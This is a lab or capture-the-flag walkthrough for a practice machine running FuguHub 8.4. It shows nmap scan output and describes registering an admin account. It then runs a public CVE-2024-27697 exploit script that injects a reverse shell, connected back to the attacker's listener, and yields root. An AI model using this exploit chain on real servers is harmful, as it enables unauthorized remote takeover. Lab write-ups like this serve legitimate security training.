#box #RCE #FuguHub

Hub is a machine characterized by a vulnerability in FuguHub, a Cloud Media Server Software. The version running on the machine is version 8.4 and it's vulnerable to an Authenticated RCE. We're actually able to create an administrator account once landed on the machine, thus we can easily exploit and gain the foothold.

## Nmap

```bash
# Nmap 7.95 scan initiated Fri Jul 18 13:14:53 2025 as: /usr/lib/nmap/nmap -o scv --min-rate=10000 -sCV 192.168.231.25
Nmap scan report for 192.168.231.25
Host is up (0.039s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 c9:c3:da:15:28:3b:f1:f8:9a:36:df:4d:36:6b:a7:44 (RSA)
|   256 26:03:2b:f6:da:90:1d:1b:ec:8d:8f:8d:1e:7e:3d:6b (ECDSA)
|_  256 fb:43:b2:b0:19:2f:d3:f6:bc:aa:60:67:ab:c1:af:37 (ED25519)
80/tcp   open  http     nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: 403 Forbidden
8082/tcp open  http     Barracuda Embedded Web Server
|_http-server-header: BarracudaServer.com (Posix)
| http-webdav-scan: 
|   Server Date: Fri, 18 Jul 2025 17:15:11 GMT
|   Allowed Methods: OPTIONS, GET, HEAD, PROPFIND, PATCH, POST, PUT, COPY, DELETE, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK
|   WebDAV type: Unknown
|_  Server Type: BarracudaServer.com (Posix)
| http-methods: 
|_  Potentially risky methods: PROPFIND PATCH PUT COPY DELETE MOVE MKCOL PROPPATCH LOCK UNLOCK
|_http-title: Home
9999/tcp open  ssl/http Barracuda Embedded Web Server
|_http-server-header: BarracudaServer.com (Posix)
| http-methods: 
|_  Potentially risky methods: PROPFIND PATCH PUT COPY DELETE MOVE MKCOL PROPPATCH LOCK UNLOCK
| http-webdav-scan: 
|   Server Date: Fri, 18 Jul 2025 17:15:11 GMT
|   Allowed Methods: OPTIONS, GET, HEAD, PROPFIND, PATCH, POST, PUT, COPY, DELETE, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK
|   WebDAV type: Unknown
|_  Server Type: BarracudaServer.com (Posix)
|_http-title: Home
| ssl-cert: Subject: commonName=FuguHub/stateOrProvinceName=California/countryName=US
| Subject Alternative Name: DNS:FuguHub, DNS:FuguHub.local, DNS:localhost
| Not valid before: 2019-07-16T19:15:09
|_Not valid after:  2074-04-18T19:15:09
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jul 18 13:15:14 2025 -- 1 IP address (1 host up) scanned in 21.00 seconds
```

## 80/8082/9999 - HTTP/S

After navigating on those 3 ports we discover the existence of FuguHub on port 8082 (it actually works also on 9999, but by being in HTTPS it doesn't seem vulnerable to the exploit). We register an administrator account  and we authenticate onto it to discover its version.
Once inside, we discover that it's version 8.4 and it's vulnerable to Authenticated RCE within [CVE-2024-27697](https://github.com/SanjinDedic/FuguHub-8.4-Authenticated-RCE-CVE-2024-27697).
We then download the exploit and configure it by adjusting username and password with the one provided during the registration. We then execute the script (meanwhile we run a netcat listener):

```bash
┌──(root㉿kali)-[~/Desktop/OSCP/Hub]
└─# python3 exploit.py -r 192.168.231.25 -rp 8082 -l 192.168.45.231 -p 4444
[*] Checking for admin user...
[+] An admin user exists..
[+] Logging in...
[+] Success! Injecting the reverse shell...
[+] Successfully injected the reverse shell into the About page.
[+] Triggering the reverse shell, check your listener...
```

Within this RCE, we'll notice that user we're running the tool into is root, thus we'd have achieved root of the machine.


